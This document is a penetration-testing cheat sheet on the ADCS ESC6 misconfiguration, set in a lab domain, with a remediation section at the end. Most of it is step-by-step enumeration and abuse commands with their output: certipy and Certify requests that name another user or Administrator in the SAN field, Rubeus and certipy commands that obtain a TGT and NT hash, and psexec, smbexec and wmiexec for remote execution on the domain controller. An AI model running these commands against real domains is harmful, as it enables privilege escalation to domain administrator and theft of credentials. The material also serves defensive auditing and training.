### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)
- [Remediation](#remediation)

> CA Misconfiguration.

---
### Overview

If `EDITF_ATTRIBUTESUBJECTALTNAME2` registry flag is set, The CA can be vulnerable to ESC6. ESC6 was patched as part of the [May 2022 Security Updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923).

A low-privileged user can request a certificate with an arbitrary name in the SAN field (e.g. Administrator). The CA will automatically issue it without human approval.

ESC6 is closely related to ESC1: Both rely on a user being able to supply a SAN and having enrollment rights. The key difference is that ESC6 abuses CA-level auto-issuance rather than ESC1 abusing a vulnerable template. The CA level behavior makes exploitation faster and more scalable, so that any template with Client Authentication (1.3.6.1.5.5.7.3.2) EKU can be exploited, (e.g., the default User template).

#### Requirements

1. The CA is configured to auto-issue requests (request disposition set to Issue),
2. The Certificate Authority (CA) sets user-supplied SAN flag to enable,
3. An over-permissive group or low-privileged user is granted enrollment rights.

---
### From Linux
#### Linux - Enumeration

```bash
$ certipy find -u 'user1@lab.local' -p 'pass' -dc-ip <IP> -vulnerable -stdout
Certificate Authorities
  0
    CA Name                             : LAB.LOCAL\Authenticated Users
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    <SNIP>
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Enabled  #<<<<<<<<<<<<<<<<
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
	<SNIP>
    [+] User Enrollable Principals      : LAB.LOCAL\Authenticated Users
	<SNIP>
    [!] Vulnerabilities
      ESC6                              : Enrollee can specify SAN.
	<SNIP>
```

#### Linux - Abuse

```bash
# Abuse the misconfigured CA EDITF_ATTRIBUTESUBJECTALTNAME2 attribute by arbitrary adding SAN when requesting a certificate from any template with Client Authentication (1.3.6.1.5.5.7.3.2) EKU.
$ certipy req -u 'user1@lab.local' -p 'pass' -ca lab-LAB-DC-CA  -target <IP> -template User -upn user2@lab.local

# Getting a TGT and the NT hash for the targeted user
$ certipy auth -pfx user2.pfx -domain lab.local -dc-ip <IP>

KRB5CCNAME=user2.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
KRB5CCNAME=user2.ccache psexec.py -k -no-pass LAB-DC.LAB.LOCAL
KRB5CCNAME=user2.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

---
### From Windows
#### Windows - Enumeration

Using `certutil.exe`

```PowerShell
# "CA-SERVER\CA-NAME"  
PS C:\tools> certutil -config "LAB-DC.lab.local\LAB-DC.lab.local" -getreg policy\EditFlags
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\lab-LAB-DC-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
	<SNIP>
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144) #<<<<<<<<<<<<<<<<<<<<<<
```

Using `PowerShell`:

```PowerShell
# Set the <CA_SERVER_NAME> 
if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_SERVER_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy").EditFlags -band 0x00040000) { "VULNERABLE - ESC6" } else { "NOT SET" }

VULNERABLE - ESC6
```

Using `Certify.exe`:

```PowerShell
PS C:\tools> .\Certify.exe cas

<SNIP>
[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : lab-LAB-DC-CA
    DNS Hostname                  : LAB-DC.lab.local
    FullName                      : LAB-DC.lab.local\lab-LAB-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lab-LAB-DC-CA, DC=lab, DC=local
    <SNIP>
    Cert Chain                    : CN=lab-LAB-DC-CA,DC=lab,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
<SNIP>
```

#### Windows - Abuse

```PowerShell
# 

# Request a certificate abusing ESC6
PS C:\Tools>  .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /altname:Administrator
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](PEM%20to%20PFX.md) 

```PowerShell
# Get a TGT and the NThash of the Administrator Account
PS C:\Tools> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```


---
### Remediation

Remove the registry flag using `certutil` or PowerShell

```PowerShell
PS C:\> certutil -config "CA-SERVER\CA-NAME" -setreg policy\EditFlags -0x00040000

PS C:\> $ConfigReader.SetConfigEntry(1114446,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

- Avoid setting request disposition to Issue for Certificate Authorities that are reachable by non-privileged users.
- Configure Issuance Requirements to ensure that requests are manually validated and approved.
- Remove user-supplied SAN options from Certificate Authorities that contain non-privileged users in the enrollees.
- Routinely audit existing templates with tools such as `Certipy` for potential misconfigurations.